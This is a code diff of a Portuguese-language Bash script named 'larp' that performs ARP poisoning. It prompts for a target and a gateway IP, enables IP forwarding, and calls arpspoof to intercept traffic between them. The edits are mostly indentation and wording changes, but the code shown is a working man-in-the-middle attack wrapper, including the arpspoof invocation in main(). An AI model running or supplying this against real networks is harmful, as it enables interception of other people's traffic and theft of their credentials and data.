@@ -79,7 +79,7 @@ function verifica_ip_forward()
 
 function checa_host
 {
-	ping -q -c 4 $1 > /dev/null
+	ping -q -c 4 -b $1 > /dev/null
 	if [ "$?" == "2" ]; then
 		log_err "Ip incorreto\n"
 		exit $?
@@ -96,7 +96,7 @@ function checa_host
 function get_alvos()
 {
 	read -p 'Ip do alvo: ' ip_alvo
-	read -p 'Ip do roteador: ' ip_roteador
+	read -p 'Ip de destino do alvo (geralmente é o gateway): ' ip_roteador
 	
 	if [ "$ip_alvo" == "$ip_roteador" ]; then
 		log_err "Alvo e roteador sao os mesmos?"
@@ -105,7 +105,7 @@ function get_alvos()
 
 	log_info "Verificando alvo ..."
 	checa_host $ip_alvo
-	log_info "Verificando roteador ..."
+	log_info "Verificando destino ..."
 	checa_host $ip_roteador
 	
 	log_info "Devo interceptar o trafego entre: $ip_alvo e $ip_roteador."
@@ -156,7 +156,7 @@ function desenha_linha_horizontal()
 
 function mostra_banner()
 {
-	caminho_shell_32_dll="C:\\Windows\\system32\\shell32.dll"
+	caminho_shell_32_dll="c:\\windows\\system32\\shell32.dll"
 	desenha_linha_horizontal $TAMANHO_LINHA
 	echo ""
 	log_show "larp v$V_MAJOR.$V_MINOR.$V_PATCH - ferramenta para realizar envenenamento ARP"
@@ -165,8 +165,8 @@ function mostra_banner()
 	log_show "Dependencias:"
 	mostra_dependencias
 	if [ -f $caminho_shell_32_dll ]; then
-	log_err "Estou no windows, mas fui escrito para o Linux :("
-	exit 1
+		log_err "Estou no windows, mas fui escrito para o Linux :("
+		exit 1
 	fi
 }
 
@@ -186,18 +186,18 @@ function main()
 	get_interface
 	echo $interface | grep -e wlan -e eth -o > /dev/null
 	if [ "$?" != "0" ]; then
-	log_err "Interface incorreta selecionada"
+		log_err "Interface incorreta selecionada"
 	else
-	log_info "Atacando pela interface $interface ..."
+		log_info "Atacando pela interface $interface ..."
 	fi
 
 	verifica_ip_forward
 	log_ok "Aplicando o envenenamento ARP ao alvo '$ip_alvo' ..."
 	envenenamento="$(arpspoof -i $interface -t $ip_alvo -r $ip_roteador)"
 	if [ "$?" != "0" ]; then
-	log_err "O ataque falhou. Verifique se o pacote dsniff foi instalado"
+		log_err "O ataque falhou. Verifique se o pacote dsniff foi instalado"
 	else
-	log_ok "O ataque foi terminado com sucesso\n"
+		log_ok "O ataque foi terminado com sucesso\n"
 	fi
 	resetar_configs_pacotes_ipv4
 }
